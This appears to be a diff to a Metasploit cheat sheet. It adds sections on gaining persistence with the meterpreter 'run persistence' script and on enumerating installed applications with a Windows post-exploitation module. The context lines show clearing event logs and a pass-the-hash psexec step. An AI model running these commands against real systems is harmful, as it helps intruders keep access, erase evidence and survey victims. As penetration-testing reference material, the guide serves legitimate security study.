@@ -177,6 +177,16 @@ Clear event logs:
 ```bash
 clearev
 ```
+## Persistence
+An quick and easy way to achive persistence is to use the build in persistence script: 
+
+```bash
+# default options
+run persistence
+
+# check out all the options
+run persistence -h
+```
 
 ## Privilege escalation
 In most cases you start with low privileged, and therefore you need to find a way to escalate to higher privileges. The possibility to do this depends if you can find a vulnerability on the system.
@@ -231,6 +241,14 @@ set SMBPass <password hash>
 expoit
 ```
 If this doesn't work, check if the AV on the target is removing the payload and if the firewall allows the connections. In a local network you also need to enable network discovery and the admin share[6].
+
+## Enumerate Applications
+If you want to check out the installed applications:
+```bash
+use post/windows/gather/enum_applications
+set SESSION <session id>
+expoit
+```
 
 
 [^1]: Metasploit ](https://www.metasploit.com/)
